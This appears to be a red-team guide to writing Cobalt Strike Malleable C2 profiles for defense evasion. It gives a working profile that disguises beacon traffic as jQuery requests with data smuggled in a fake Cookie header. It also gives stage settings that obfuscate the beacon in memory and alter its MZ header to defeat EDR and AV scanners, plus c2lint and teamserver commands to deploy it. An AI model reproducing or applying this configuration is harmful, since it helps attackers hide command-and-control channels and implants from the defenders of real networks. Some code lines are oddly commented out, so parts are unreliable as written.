# Cobalt Strike Malleable C2 Defense Evasion

## When to Use
- During red team engagements where network egress filters and deep packet inspection (DPI) appliances intercept communication.
- To bypass threat intelligence feeds that target default Cobalt Strike beacon indicators (e.g., default checksums, empty HTTP headers, known User-Agents).


## Prerequisites
- Active engagement with a defended target environment (EDR/AV present)
- Understanding of the target's security stack (Defender, CrowdStrike, Carbon Black, etc.)
- Payload development framework (msfvenom, Cobalt Strike, custom tooling)
- Test environment matching the target OS/EDR for pre-engagement validation

## Workflow

### Phase 1: Designing the Profile

Profiles define what the HTTP GET/POST requests and responses look like. They utilize blocks like `http-get`, `http-post`, and data manipulation functions (`append`, `prepend`, `base64url`).

```text
# Concept: A snippet to masquerade as jQuery HTTP traffic set sample_name "jQuery Traffic";

http-get {
    set uri "/jquery-3.3.1.min.js";

    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Host" "code.jquery.com";
        
        metadata {
            base64url;
            prepend "__cfduid=";
            header "Cookie";
        }
    }

    server {
        header "Content-Type" "application/javascript; charset=utf-8";

        output {
            base64url;
            prepend "/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */\n";
            append "\nfunction $(e){return new jQuery(e)}";
            print;
        }
    }
}
```

### Phase 2: Obfuscating Beacon Payload in Memory

Malleable C2 profiles also govern how the payload behaves in host memory (stage 2). This is critical for evading EDR/AV memory scanners.

```text
# stage {
    set userwx "false";          # Avoid RWX memory allocations (RWX is suspicious)
    set obfuscate "true";        # Obfuscate the core beacon DLL in memory
    set cleanup "true";          # Free memory associated with the reflective loader
    set magic_mz_x86 "OOPS";     # Alter the PE MZ header to break signature scanners
    
    transform-x86 {
        prepend "\x90\x90";      # NOP sled prefix
    }
}
```

### Phase 3: Validation (C2lint)

Before restarting your Team Server, you MUST validate your profile syntax.

```bash
# ./c2lint profiles/jquery.profile
```
Ensure there are no errors and that the simulated traffic matches your intended design.

### Phase 4: Implementation

Restart the Cobalt Strike team server pointing to the new profile.

```bash
# ./teamserver <IP> <Password> profiles/jquery.profile
```
Generate new executable beacon payloads (since memory evasion flags change compilation).
